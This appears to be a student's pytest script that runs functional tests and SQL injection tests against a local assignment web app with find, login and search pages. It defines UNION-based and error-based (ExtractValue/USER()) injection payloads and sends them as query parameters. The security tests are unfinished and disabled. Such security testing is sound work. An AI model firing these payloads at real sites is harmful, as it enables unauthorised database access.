#!/usr/bin/env python3

# Python script that calls the target application attached to this assignment, and shows a summary of the results. 
# Author: Lorenzo La Corte

from argparse import ArgumentParser, BooleanOptionalAction, Namespace
import unittest
from urllib.parse import urlencode, quote_plus
import logging
import random
import subprocess
import time
import uuid
import os
from pathlib import Path
import asyncio
import aiohttp
import pytest
import requests

logging.basicConfig(filename="requests.log",
                    filemode='w',
                    format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                    datefmt='%H:%M:%S',
                    level=logging.DEBUG)


# TODO: refactor
def CollectTargets(basepath):
    targets: dict[str, list[str]] = {}
    basepath = Path(basepath)
    subdirs = basepath.iterdir()

    for subdir in subdirs:
        if subdir.is_file(): continue
        targets[subdir.name] = []
        for file in subdir.iterdir():
            if file.is_file():  targets[subdir.name].append(subdir.name+'/'+file.name)

    return targets


# TODO: refactor with args: https://stackoverflow.com/questions/40880259/how-to-pass-arguments-in-pytest-by-command-line
basepath = "Application/"
targets = CollectTargets(basepath)
IP = "localhost"
PORT = 9000

union_payloads = [
        "' UNION ALL SELECT __COLS__ -- - ",
        "\" UNION ALL SELECT __COLS__ -- - ",
        "1 UNION ALL SELECT __COLS__ -- - ",
]

error_payloads = [
        "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - ",
        "\" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - ",
        "1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - ",
]

# --------------------------- REQUEST METHOD --------------------------- #

# Function that do the request 
# Takes in input the target page
# Takes in input the parameter dict (param: value) to insert in the query
# Takes in input the query method {GET, POST}
# Takes in input the oracle and return True if it is in the response
def send_request(target, params, method, oracle, union_cols = None) -> bool:

    if union_cols: pass # TODO in params, substitute __COLS__ with union_cols

    if method == "GET": 
        response = requests.get(f"http://{IP}:{PORT}/{target}", params=params)
        print(f"Sending request to: http://{IP}:{PORT}/{target} - With params: {params}")

    if response.status_code != 200:
        raise Exception(f"Error: {response.status_code}")

    print(f"Result is: {response.text}\n")
    return oracle in response.text

# ------------------------- FUNCTIONAL TESTING ------------------------- #

@pytest.mark.parametrize("page", targets['find'])
def test_functional_step_find(page):
    # Functional: $search = Apple
    # Oracle: Apple
    params = {"search": "Apple"}
    oracle = "Apple"
    assert send_request(page, params, "GET", oracle) # GET is to change


@pytest.mark.parametrize("page", targets['login'])
def test_functional_step_login(page):
    # Functional: $user=any, $pass=password
    # Oracle: "Welcome"
    params = {"user": "any", "pass": "password"}
    oracle = "Welcome"
    assert send_request(page, params, "GET", oracle) # GET is to change

@pytest.mark.parametrize("page", targets['search'])
def test_functional_step_search(page):
    # Functional: $max = 100
    # Oracle: "Apple" for {,2,4} and "3.00 €" for {3}
    params = {"max": 100} if "price" in page else {"search": "Apple"}
    oracle = "3.00 €" if "search_by_price3" in page else "Apple"
    assert send_request(page, params, "GET", oracle) # GET is to change


# ------------------------- SECURITY TESTING ------------------------- #


@pytest.mark.parametrize("page", targets['find'])
@pytest.mark.parametrize("payload", union_payloads+error_payloads)
def tes_security_step_find(page, payload): # TODO: Fix and enable with "test"
    params = {"search": payload}
    oracle = "root"
    assert send_request(page, params, "GET", oracle)

@pytest.mark.parametrize("page", targets['login'])
@pytest.mark.parametrize("payload", union_payloads+error_payloads)
def tes_security_step_login(page, payload): # TODO: Fix and enable with "test"
    params = {"user": "any", "pass": payload}
    oracle = "root"
    assert send_request(page, params, "GET", oracle) # GET is to change

@pytest.mark.parametrize("page", targets['search'])
@pytest.mark.parametrize("payload", union_payloads+error_payloads)
def tes_security_step_search(page, payload): # TODO: Fix and enable with "test"
    params = {"max": payload} if "price" in page else {"search": payload}
    oracle = "root"
    assert send_request(page, params, "GET", oracle)
